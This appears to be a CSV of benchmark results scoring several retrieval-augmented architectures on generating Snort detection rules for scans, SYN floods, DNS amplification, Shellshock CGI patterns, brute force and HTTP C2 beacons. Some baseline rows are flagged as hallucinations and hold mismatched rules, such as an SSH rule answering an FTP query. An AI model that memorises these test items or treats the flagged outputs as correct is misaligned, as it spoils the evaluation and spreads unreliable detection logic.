query_id,architecture,query,precision_at_3,recall_at_3,recall_at_5,mrr,ndcg_at_5,family_accuracy,type_accuracy,protocol_accuracy,port_accuracy,snort_syntax_valid,rule_token_jaccard,hallucination_flag,expected_doc_id,retrieved_ids,generated_family,expected_family,generated_type,expected_type,generated_rule
Q_007,rag_classic,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,rag_rerank,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0001;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,rag_hybrid,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,multi_hop,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0018;SNORT_0069;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,graph_rag,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9166666666666666,0.0,SNORT_0137,SNORT_0001;SNORT_0137;SNORT_0003;SNORT_0101;SNORT_0108,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_007,agentic_rag,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_008,baseline,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,1.0,SNORT_0116,,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000014; rev:1;)"
Q_008,rag_classic,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,rag_rerank,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,rag_hybrid,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,multi_hop,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_008,graph_rag,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0116,SNORT_0116;SNORT_0031;SNORT_0150;SNORT_0082;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000116; rev:1;)"
Q_008,agentic_rag,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9259259259259259,0.0,SNORT_0116,SNORT_0031;SNORT_0116;SNORT_0150;SNORT_0099;SNORT_0065,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000031; rev:1;)"
Q_009,baseline,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.4838709677419355,1.0,SNORT_0088,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_009,rag_classic,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0069;SNORT_0018;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,rag_rerank,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0054;SNORT_0139;SNORT_0137;SNORT_0071,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0069;SNORT_0018;SNORT_0004,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,multi_hop,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0156;SNORT_0071;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,graph_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0054;SNORT_0003;SNORT_0069;SNORT_0139,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_009,agentic_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0088,SNORT_0088;SNORT_0139;SNORT_0069;SNORT_0018;SNORT_0004,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)"
Q_010,baseline,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0035,,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,rag_classic,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0001;SNORT_0137,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,rag_rerank,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0001;SNORT_0137,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,rag_hybrid,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0020;SNORT_0018,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,multi_hop,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0001;SNORT_0137,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,graph_rag,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0052;SNORT_0069,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_010,agentic_rag,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0035,SNORT_0035;SNORT_0120;SNORT_0154;SNORT_0020;SNORT_0018,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)"
Q_011,baseline,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0118,,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000016; rev:1;)"
Q_011,rag_classic,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0050;SNORT_0016;SNORT_0084;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,rag_rerank,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0050;SNORT_0016;SNORT_0084;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,rag_hybrid,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0016;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,multi_hop,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0067;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,graph_rag,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0101;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_011,agentic_rag,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0118,SNORT_0118;SNORT_0084;SNORT_0050;SNORT_0016;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)"
Q_012,baseline,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.6451612903225806,1.0,SNORT_0146,,Brute_Force,Brute_Force,SSH Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_012,rag_classic,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,rag_rerank,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,rag_hybrid,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,multi_hop,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0095;SNORT_0146;SNORT_0129;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000095; rev:1;)"
Q_012,graph_rag,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0112;SNORT_0061,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_012,agentic_rag,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0146,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_013,baseline,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0011,,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,rag_classic,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,rag_rerank,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
